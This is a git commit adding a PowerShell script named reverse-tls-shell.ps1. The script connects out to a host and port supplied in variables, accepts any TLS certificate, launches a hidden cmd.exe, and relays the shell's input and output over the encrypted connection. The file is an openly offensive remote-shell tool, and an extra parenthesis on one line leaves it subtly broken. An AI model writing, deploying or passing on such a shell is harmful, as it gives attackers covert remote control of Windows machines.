c81aeb2eb76fec4da43d6c00d8a620ea1d9013ea
Filip's World <52132369+FilipsWorld@users.noreply.github.com>
2020-03-18 12:52:11 +0100

    Create reverse-tls-shell.ps1

---
+++ scripts/powershell/reverse-tls-shell.ps1
@@ -0,0 +1,27 @@
+$socket = new-object net.sockets.tcpclient($a,$b)
+$tcpstream = $socket.getstream()
+$tlsstream = new-object net.security.sslstream($tcpstream,$false,[net.security.remotecertificatevalidationcallback]{$true}))
+$tlsstreamwriter = new-object io.streamwriter($tlsstream)
+$tlsstreamwriter.autoflush = $true
+$tlsstreamreader = new-object io.streamreader($tlsstream)
+$shellinfo = new-object diagnostics.processstartinfo
+$shellinfo.filename = "cmd.exe"
+$shellinfo.createnowindow = $true
+$shellinfo.useshellexecute = $false
+$shellinfo.redirectstandardoutput = $true
+$shellinfo.redirectstandarderror = $true
+$shellinfo.redirectstandardinput = $true
+$shell = new-object diagnostics.process
+$shell.startinfo = $shellinfo
+$shell.start()
+$stdout = $shell.standardoutput
+$stderr = $shell.standarderror
+$stdin = $shell.standardinput
+while(($shell.hasexited -eq $false))
+{
+	while($stdout.endofstream -eq $false)
+	{
+		$tlsstreamwriter.writeline($stdout.readline())
+		$stdin.writeline($tlsstreamreader.readline())
+	}
+}
